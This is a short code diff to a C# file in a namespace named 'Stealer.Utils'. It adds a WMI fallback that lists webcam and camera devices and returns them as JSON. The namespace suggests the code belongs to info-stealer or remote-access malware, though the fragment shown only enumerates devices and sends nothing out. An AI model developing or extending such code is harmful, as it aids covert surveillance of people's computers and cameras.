@@ -171,9 +171,27 @@ namespace Stealer.Utils
                 }
             }
 
+            // Fallback to WMI if both DirectShow and avicap32 returned 0 items
             if (list.Count == 0)
             {
-                list.Add("{\"id\":0,\"name\":\"Primary Webcam\"}");
+                try
+                {
+                    using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera' OR PNPClass = 'Image' OR Caption LIKE '%Camera%' OR Caption LIKE '%Webcam%'"))
+                    {
+                        int idx = 0;
+                        foreach (var device in searcher.Get())
+                        {
+                            string caption = device["Caption"]?.ToString();
+                            if (!string.IsNullOrEmpty(caption))
+                            {
+                                caption = caption.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                                list.Add("{\"id\":" + idx + ",\"name\":\"" + caption + "\"}");
+                                idx++;
+                            }
+                        }
+                    }
+                }
+                catch { }
             }
 
             return "[" + string.Join(",", list.ToArray()) + "]";
